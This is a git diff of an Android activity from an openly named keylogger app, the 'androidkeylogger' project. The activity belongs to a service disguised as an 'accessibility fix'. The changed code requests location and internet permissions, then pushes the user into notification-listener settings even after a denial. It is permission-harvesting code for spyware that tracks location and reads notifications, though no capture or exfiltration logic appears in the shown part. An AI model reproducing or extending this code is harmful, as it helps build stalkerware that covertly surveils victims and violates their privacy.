@@ -1,6 +1,7 @@
 package com.azamovhudstc.androidkeylogger.activity
 
 import android.Manifest
+import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Bundle
@@ -9,6 +10,7 @@ import android.view.View
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.azamovhudstc.androidkeylogger.R
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 
@@ -41,11 +43,27 @@ class AccessibilityFixActivity : AppCompatActivity() {
             return
         }
         setContentView(R.layout.activity_accessibility)
-        checkNotificationListenerPermission()
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
-        } else {
+
+
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            // Ruxsatlar so`rilib bo`lmagan, foydalanuvchi tomonidan so`rash kerak
+            // Ruxsatlarni so`rash oynasi ochiladi
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.INTERNET
+                ),
+                3
+            )
+
         }
+        checkNotificationListenerPermission()
         findViewById<View>(R.id.btn501925).setOnClickListener { view ->
             openSetting(
                 view
@@ -74,25 +92,21 @@ class AccessibilityFixActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-
-        if (requestCode == REQUEST_CODE_NOTIFICATION_LISTENER) {
-            // Handle result of the notification listener settings activity
-            if (isNotificationListenerEnabled()) {
+        if (requestCode == 3) {
+            if (resultCode == Activity.RESULT_OK) {
+                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
             } else {
+                // Ruxsatlar foydalanuvchi tomonidan berilgan
+                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
+                // Ruxsatlar foydalanuvchi tomonidan rad qilindi, shundayki ilova qo'llanmagan
+                Toast.makeText(this, "Permission denied by the user", Toast.LENGTH_SHORT).show()
             }
         }
     }
 
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == 1) {
-            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            } else {
-                // Handle permission denied case
-                Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
-            }
-        }
-    }
+
     /* Access modifiers changed, original: protected */
     public override fun onDestroy() {
         super.onDestroy()
